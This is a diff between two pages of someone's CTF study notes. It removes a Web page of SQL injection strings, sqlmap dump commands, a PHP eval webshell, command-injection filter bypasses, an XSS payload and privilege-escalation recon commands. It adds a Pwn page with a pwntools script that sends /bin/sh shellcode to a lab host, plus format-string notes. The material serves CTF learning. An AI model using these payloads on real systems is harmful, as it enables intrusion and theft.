@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://note.huaeryi.com/ctf/web/">
+        <link rel="canonical" href="https://note.huaeryi.com/ctf/pwn/">
       
       
-        <link rel="prev" href="../crypto/">
+        <link rel="prev" href="../reverse/">
       
       
-        <link rel="next" href="../reverse/">
+        <link rel="next" href="../android/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Web - Huayi's Notebook</title>
+        <title>Pwn - Huayi's Notebook</title>
       
     
     
@@ -114,7 +114,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#chorme" class="md-skip">
+        <a href="#shellcode" class="md-skip">
           跳转至
         </a>
       
@@ -148,7 +148,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Web
+              Pwn
             
           </span>
         </div>
@@ -760,27 +760,9 @@
                 
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Web
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../web/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -789,327 +771,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#chorme" class="md-nav__link">
-    Chorme开发人员工具
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssh" class="md-nav__link">
-    SSH协议
-  </a>
-  
-    <nav class="md-nav" aria-label="SSH协议">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    基于口令认证
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    基于密钥的安全认证
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    信息探测
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    分析探测结果，挖掘敏感信息
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    登录主机
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    权限提升
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#smb" class="md-nav__link">
-    SMB泄露
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ftp" class="md-nav__link">
-    FTP后门
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
-    SQL注入
-  </a>
-  
-    <nav class="md-nav" aria-label="SQL注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sql_1" class="md-nav__link">
-    sql基础
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    有回显
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sqlmap" class="md-nav__link">
-    sqlmap
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    无回显
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#php" class="md-nav__link">
-    PHP代码审计
-  </a>
-  
-    <nav class="md-nav" aria-label="PHP代码审计">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    弱类型
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#md5" class="md-nav__link">
-    哈希绕过（MD5）
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_10" class="md-nav__link">
-    命令注入
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#shell" class="md-nav__link">
-    常用shell命令
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#bypass" class="md-nav__link">
-    Bypass
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
-    代码执行
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#http" class="md-nav__link">
-    HTTP参数传递
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#robotstxt" class="md-nav__link">
-    robots.txt君子协定
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    反序列化
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#php_1" class="md-nav__link">
-    php伪协议
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
-    文件包含
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    XSS跨站脚本攻击
-  </a>
-  
-    <nav class="md-nav" aria-label="XSS跨站脚本攻击">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#xss_1" class="md-nav__link">
-    反射型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#xss_2" class="md-nav__link">
-    存储型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#domxss" class="md-nav__link">
-    DOM型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
-    操作
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#csrf" class="md-nav__link">
-    CSRF跨站请求伪造
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf" class="md-nav__link">
-    SSRF服务端请求伪造
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web" class="md-nav__link">
-    Web夺权模板
-  </a>
-  
-    <nav class="md-nav" aria-label="Web夺权模板">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_15" class="md-nav__link">
-    信息探测
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_16" class="md-nav__link">
-    漏洞扫描
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#nc" class="md-nav__link">
-    nc端口监听
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_17" class="md-nav__link">
-    浏览器
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1139,9 +800,27 @@
                 
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../pwn/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Pwn
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -1150,6 +829,65 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    Shellcode
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bufferoverflow" class="md-nav__link">
+    BufferOverflow
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#format-string-bug" class="md-nav__link">
+    Format String Bug
+  </a>
+  
+    <nav class="md-nav" aria-label="Format String Bug">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    内存泄露
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    内存修改
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1207,299 +945,37 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#chorme" class="md-nav__link">
-    Chorme开发人员工具
+  <a href="#shellcode" class="md-nav__link">
+    Shellcode
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#ssh" class="md-nav__link">
-    SSH协议
+  <a href="#bufferoverflow" class="md-nav__link">
+    BufferOverflow
   </a>
   
-    <nav class="md-nav" aria-label="SSH协议">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#format-string-bug" class="md-nav__link">
+    Format String Bug
+  </a>
+  
+    <nav class="md-nav" aria-label="Format String Bug">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    基于口令认证
+    内存泄露
   </a>
   
 </li>
         
           <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    基于密钥的安全认证
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    信息探测
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    分析探测结果，挖掘敏感信息
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    登录主机
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    权限提升
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#smb" class="md-nav__link">
-    SMB泄露
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ftp" class="md-nav__link">
-    FTP后门
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
-    SQL注入
-  </a>
-  
-    <nav class="md-nav" aria-label="SQL注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sql_1" class="md-nav__link">
-    sql基础
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    有回显
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sqlmap" class="md-nav__link">
-    sqlmap
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    无回显
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#php" class="md-nav__link">
-    PHP代码审计
-  </a>
-  
-    <nav class="md-nav" aria-label="PHP代码审计">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    弱类型
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#md5" class="md-nav__link">
-    哈希绕过（MD5）
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_10" class="md-nav__link">
-    命令注入
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#shell" class="md-nav__link">
-    常用shell命令
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#bypass" class="md-nav__link">
-    Bypass
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
-    代码执行
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#http" class="md-nav__link">
-    HTTP参数传递
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#robotstxt" class="md-nav__link">
-    robots.txt君子协定
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    反序列化
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#php_1" class="md-nav__link">
-    php伪协议
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
-    文件包含
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    XSS跨站脚本攻击
-  </a>
-  
-    <nav class="md-nav" aria-label="XSS跨站脚本攻击">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#xss_1" class="md-nav__link">
-    反射型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#xss_2" class="md-nav__link">
-    存储型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#domxss" class="md-nav__link">
-    DOM型XSS
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
-    操作
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#csrf" class="md-nav__link">
-    CSRF跨站请求伪造
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf" class="md-nav__link">
-    SSRF服务端请求伪造
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web" class="md-nav__link">
-    Web夺权模板
-  </a>
-  
-    <nav class="md-nav" aria-label="Web夺权模板">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_15" class="md-nav__link">
-    信息探测
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_16" class="md-nav__link">
-    漏洞扫描
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#nc" class="md-nav__link">
-    nc端口监听
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_17" class="md-nav__link">
-    浏览器
+    内存修改
   </a>
   
 </li>
@@ -1527,221 +1003,72 @@
   
 
 
-  <h1>Web</h1>
+  <h1>Pwn</h1>
 
-<h3 id="chorme">Chorme开发人员工具</h3>
+<h3 id="shellcode">Shellcode</h3>
 <ul>
-<li>右键<code>检查</code>或<code>Crtl + Shift + I</code>打开开发人员工具</li>
-<li>Hackbar插件集成了常用的web请求、攻击手段</li>
+<li>checksec检测程序防御方式</li>
+<li>pwntools编写shellcode攻击脚本</li>
 </ul>
-<h3 id="ssh">SSH协议</h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:1"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Python</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c1"># context.log_level = &#39;debug&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;10.214.160.13&#39;</span><span class="p">,</span> <span class="mi">11003</span><span class="p">)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="s1">        mov edx, 0</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="s1">        mov ecx, 0</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="s1">        push 0x68732f</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="s1">        push 0x6e69622f</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="s1">        mov ebx, esp</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="s1">        mov eax, 0xb</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="s1">        int 0x80</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+<h3 id="bufferoverflow">BufferOverflow</h3>
+<details class="bug" open="open">
+<summary>Format String Bug</summary>
+</details>
+<h3 id="format-string-bug">Format String Bug</h3>
 <ul>
-<li>ssh（Secure Shell） 22端口</li>
+<li>全称格式化字符串漏洞</li>
 </ul>
-<h4 id="_1">基于口令认证</h4>
+<h4 id="_1">内存泄露</h4>
 <ul>
-<li>通过账号和口令登录到远程主机</li>
-<li>弱口令暴力破解获取用户名和密码，不一定获取root权限</li>
+<li>以<code>printf()</code>为例</li>
+<li><code>%d</code> - 十进制 - 输出十进制整数</li>
+<li><code>%s</code> - 字符串 - 从内存中读取字符串</li>
+<li><code>%x</code> - 十六进制 - 输出十六进制数</li>
+<li><code>%c</code> - 字符 - 输出字符</li>
+<li><code>%p</code> - 指针 - 指针地址</li>
+<li><code>%n</code> - 到目前为止所写的字符数</li>
 </ul>
-<h4 id="_2">基于密钥的安全认证</h4>
-<ul>
-<li><code>id_rsa</code> 私钥</li>
-<li><code>id_rsa.pub</code> 公钥</li>
-<li><code>chmod 600 id_rsa</code></li>
-<li><code>ssh -i id_rsa 用户名@主机地址</code> 登陆服务器</li>
-</ul>
-<h4 id="_3">信息探测</h4>
-<ul>
-<li><code>nmap -sV ip</code> 挖掘开放服务信息</li>
-<li><code>nmap -A -v ip</code> 探测靶场全部信息</li>
-<li><code>nmap -O ip</code> 探测靶场操作系统类型与版本</li>
-</ul>
-<h4 id="_4">分析探测结果，挖掘敏感信息</h4>
-<ul>
-<li>ssh22端口考虑暴力破解和私钥泄露</li>
-<li>http服务80端口考虑浏览器访问和探测工具</li>
-<li><code>dirb http://ip:port/</code> 对服务隐藏文件探测</li>
-<li><code>nikto -host ip</code> 挖掘敏感信息</li>
-</ul>
-<h4 id="_5">登录主机</h4>
-<ul>
-<li><code>ssh -i id_rsa name@ip</code> 以name身份登录ip主机</li>
-<li><code>find / -perm -4000 2&gt;/dev/null</code> 查找具有root权限的文件</li>
-</ul>
-<h4 id="_6">权限提升</h4>
-<ul>
-<li><code>whoami</code>查看用户</li>
-<li><code>id</code>查看权限</li>
-<li><code>msfconsole</code>集成的攻击框架</li>
-<li><code>/etc/crontab</code> 定时执行的文件</li>
-<li><code>nc ip port</code> 监听端口</li>
-<li><code>python -c "import pty;pty.spawn('/bin/bash')"</code> 优化shell</li>
-</ul>
-<h3 id="smb">SMB泄露</h3>
-<ul>
-<li>SMB 139 445端口</li>
-<li><code>smbclient -L ip</code> </li>
-</ul>
-<h3 id="ftp">FTP后门</h3>
-<ul>
-<li>msf查看版本号获取漏洞代码</li>
-</ul>
-<h3 id="sql">SQL注入</h3>
-<h4 id="sql_1">sql基础</h4>
-<ul>
-<li>RDBMS关系型数据库管理系统 库-表-列-行</li>
-</ul>
-<h4 id="_7">有回显</h4>
-<ul>
-<li><code>SELECT first_name, last_name FROM users WHERE user_id = '</code> +<code>1' or '1234' = '1234</code> + <code>'</code> 有趣的事情发生了，这条注入后的查询语句可以查询所有id的用户</li>
-<li><code>...</code> + <code>1' or 1=1 order by 3 #</code> + <code>'</code>猜解sql查询语句中的字段数,巧妙地使注入符合语法，以字段3排序，若失败则只有3-1=2列</li>
-<li><code>1' union select 1,2 #</code> 联合查询</li>
-<li><code>1' union select 1,database() #</code> 查询数据库名 </li>
-<li><code>1' union selcet 1, group_concat(table_name) from information_schema.tables where table_schema=database() #</code> 查询当前数据库的表名</li>
-<li><code>1'and 1=2 union selcet 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code> 获取表中字段名，1=2使第一个查询失效，或者使用limit</li>
-<li>
-<p><code>1'and 1=2 union selcet group_concat(user_id, first_name, last_name),group_concat(password) from users #</code> 查询数据</p>
-</li>
-<li>
-<p>报错注入构造错误信息获取内容</p>
-</li>
-<li>xpath</li>
-<li>extractvalue()</li>
-</ul>
-<h4 id="sqlmap">sqlmap</h4>
-<ul>
-<li><code>sqlmap -h</code> 帮助文档</li>
-<li><code>sqlmap -u http://xxx.com/1.php?id＝11 --dbs</code> 查看数据库名</li>
-<li><code>sqlmap -u http://xxx.com/1.php?id＝11 --current-db</code> 当前数据库信息</li>
-<li><code>sqlmap -u http://xxx.com/1.php?id＝11 -D a --tables</code> 当前数据库信息，'a' 为指定数据库名称</li>
-<li><code>sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin --columns</code> 列出指定表名的所有列名，'admin' 为指定表名称</li>
-<li><code>sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin -C name,password --dump</code> 输出表名指定列名字段的值数据，'name，password' 为指定字段名称</li>
-</ul>
-<h4 id="_8">无回显</h4>
-<ul>
-<li>布尔盲注-回显不同</li>
-<li>时间盲注-响应时间不同</li>
-<li>报错盲注</li>
-</ul>
-<h3 id="php">PHP代码审计</h3>
-<h4 id="_9">弱类型</h4>
-<ul>
-<li><code>===</code>比较时会判断类型是否相同再比较</li>
-<li><code>==</code>比较时会将字符串类型转化为相同再比较</li>
-<li>由此可以演化出一系列弱类型攻击方法</li>
-</ul>
-<h4 id="md5">哈希绕过（MD5）</h4>
-<ul>
-<li>数组 array-&gt;null可以实现强相等</li>
-<li>"0exxxxx" == "0eyyyy" //true</li>
-<li>MD5哈希碰撞可以实现字符串强相等</li>
-</ul>
-<h4 id="_10">命令注入</h4>
-<ul>
-<li>执行系统命令时注入恶意拼接的代码，一般来说web服务器的用户执行权限是www-data</li>
-<li>r = 4; w = 2; x = 1;</li>
-<li>-rwxr--r--等价于一个文件权限是744</li>
-<li>drwxr--r--等价于一个目录权限是744</li>
-</ul>
-<h4 id="shell">常用shell命令</h4>
-<ul>
-<li><code>echo 'abc' | md5sum</code> 管道</li>
-<li><code>%0a</code> <code>%0d</code> 换行符</li>
-<li><code>;</code> 无论如何都执行</li>
-<li><code>&amp;&amp;</code> 成功后执行</li>
-<li><code>||</code> 失败后执行</li>
-</ul>
-<h4 id="bypass">Bypass</h4>
-<ul>
-<li>过滤空格的绕过</li>
-<li><code>$IFS</code> <code>${IFS}</code> <code>$IFS$9</code> <code>&lt;</code> <code>&lt;&gt;</code> <code>{cat,flag.php}</code> <code>%20</code> <code>%09</code></li>
-<li>过滤关键字的绕过</li>
-<li>反斜线<code>\</code>绕过</li>
-<li>两个单引号<code>''</code>绕过</li>
-<li>base64 hex绕过</li>
-<li>通配符匹配 </li>
-<li>变量绕过</li>
-<li>双写绕过（添加自身）</li>
-</ul>
-<h4 id="_11">代码执行</h4>
-<ul>
-<li><code>&lt;? php eval($_POST[0]);?&gt;</code> 一句话木马，因为evel把字符串当代码执行</li>
-<li>异或绕过</li>
-<li>取反绕过</li>
-<li>正则表达式 ?&gt;&lt;?=<code>/???/???%20*</code> 可以匹配上 echo <code>/bin/cat/flag.php</code></li>
-<li><code>$f=create_function('$a, $b, $code');</code></li>
-</ul>
-<h4 id="http">HTTP参数传递</h4>
-<ul>
-<li>GET方法传递</li>
-<li>POST方法传递</li>
-</ul>
-<h4 id="robotstxt">robots.txt君子协定</h4>
-<ul>
-<li>口头禁止爬虫爬取robot.txt下的内容</li>
-</ul>
-<h4 id="_12">反序列化</h4>
-<ul>
-<li>序列化serialize()变量变字符串</li>
-<li>反序列化unserialize()</li>
-</ul>
-<h4 id="php_1">php伪协议</h4>
-<h4 id="_13">文件包含</h4>
-<h3 id="xss">XSS跨站脚本攻击</h3>
-<ul>
-<li>Cross-site Scripting (XSS)，攻击者注入恶意脚本代码payload，用户访问网页时自动加载</li>
-</ul>
-<h4 id="xss_1">反射型XSS</h4>
-<ul>
-<li>见框插入JS代码<code>&lt;script&gt;alert("Hello")&lt;/script&gt;</code></li>
-<li>大小写绕过</li>
-<li>双写绕过</li>
-<li>其它标签绕过img</li>
-</ul>
-<h4 id="xss_2">存储型XSS</h4>
-<ul>
-<li>多见于评论区注入，因其存储在服务器数据库中，导致持久存在</li>
-<li>htmlspecialchars()过滤</li>
-</ul>
-<h4 id="domxss">DOM型XSS</h4>
-<ul>
-<li>JS操作document，重构DOM树</li>
-</ul>
-<h4 id="_14">操作</h4>
-<ul>
-<li>XSS探针测试过滤的字符</li>
-<li>查看源代码如何闭合标签和属性</li>
-<li>构建XSS payload绕过检测</li>
-</ul>
-<h3 id="csrf">CSRF跨站请求伪造</h3>
-<ul>
-<li>CSRF，全名 Cross Site Request Forgery，跨站请求伪造</li>
-</ul>
-<h3 id="ssrf">SSRF服务端请求伪造</h3>
-<ul>
-<li>SSRF，Server-Side Request Forgery，服务端请求伪造</li>
-</ul>
-<h3 id="web">Web夺权模板</h3>
-<h4 id="_15">信息探测</h4>
-<ul>
-<li><code>nmap -sV ip</code> 挖掘开放服务信息</li>
-<li><code>nmap -A -v -T4 ip</code> 探测靶场全部信息</li>
-<li><code>nmap -O ip</code> 探测靶场操作系统类型与版本</li>
-<li><code>nikto -host ip:port</code> 挖掘敏感信息</li>
-<li><code>dirb http://ip:port/</code> 对服务隐藏文件探测</li>
-</ul>
-<h4 id="_16">漏洞扫描</h4>
-<ul>
-<li>web漏洞扫描器 owasp-zap</li>
-</ul>
-<h4 id="nc">nc端口监听</h4>
-<ul>
-<li><code>nc ip port</code> 监听端口</li>
-</ul>
-<h4 id="_17">浏览器</h4>
-<ul>
-<li>浏览器查看敏感页面源代码</li>
-</ul>
+<h4 id="_2">内存修改</h4>
 
 
 
